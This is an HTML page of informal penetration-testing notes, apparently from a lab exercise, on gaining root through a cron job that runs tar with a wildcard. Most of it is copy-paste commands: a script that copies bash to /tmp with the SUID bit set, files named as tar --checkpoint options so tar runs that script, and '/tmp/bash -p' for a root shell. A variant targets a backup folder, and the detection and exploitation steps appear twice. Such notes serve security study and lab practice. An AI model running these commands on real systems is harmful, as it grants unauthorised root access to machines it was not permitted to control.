<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Cron Wildcards</title>
</head><body><b>Escalation via Cron Wildcards</b><br/>
<br/>
<br/>
This was wild.<br/>
<br/>
TLDR<br/>
<br/>
in the instnace that a cron job calls a specific file. <br/>
further investigation identifies that it includes a wildcard *<br/>
<br/>
we inject malicious code into the wild card space. IE the code itself is happy run what ever since it will run all with the wild card.<br/>
<br/>
<br/>
<img height="369" src="image.png" width="700"/><br/>
<br/>
example.<br/>
<br/>
compress.sh was called direclty.<br/>
<br/>
cat to further investigate, identified a tar, back up command with a * wild card.<br/>
<br/>
crate a malicious file &gt; runme.sh and make it executable.<br/>
<br/>
touch a checkpoint<br/>
make that check point perform an action.<br/>
<br/>
Wait x time for the cron job to run <br/>
<br/>
execute the payload <b>/tmp/bash -p</b><br/>
<br/>
When in doubt google tar<br/>
<br/>
Keep in mind... the tar command itself could be a cron job. ie without being in its own script. same process<br/>
<br/>
* = spidey sences.<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: cat /etc/crontab<br/>
2. From the output, notice the script “/usr/local/bin/compress.sh”<br/>
3. In command prompt type: cat /usr/local/bin/compress.sh<br/>
4. From the output, notice the wildcard (*) used by ‘tar’.<br/>
 <br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
<b>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/runme.sh</b><br/>
2. <b>touch /home/user/--checkpoint=1</b><br/>
3. <b>touch /home/user/--checkpoint-action=exec=sh\ runme.sh</b><br/>
4. Wait 1 minute for the Bash script to execute.<br/>
5. In command prompt type: /tmp/bash -p<br/>
6. In command prompt type: id<br/>
<br/>
<br/>
alternate... lets say a location is backed up<br/>
<br/>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/andre/backup/shell.sh<br/>
<br/>
still need backups..<br/>
<br/>
<b>touch </b>/home/andre/backup/<b>--checkpoint=1<br/>
</b><b>touch </b>/home/andre/backup/<b>--checkpoint-action=exec=sh\ shell.sh<br/>
</b><b><br/>
<br/>
<br/>
</b><br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: cat /etc/crontab<br/>
2. From the output, notice the script “/usr/local/bin/compress.sh”<br/>
3. In command prompt type: cat /usr/local/bin/compress.sh<br/>
4. From the output, notice the wildcard (*) used by ‘tar’.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/runme.sh<br/>
2. touch /home/user/--checkpoint=1<br/>
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh<br/>
4. Wait 1 minute for the Bash script to execute.<br/>
5. In command prompt type: /tmp/bash -p<br/>
6. In command prompt type: id<b><br/>
</b></body></html>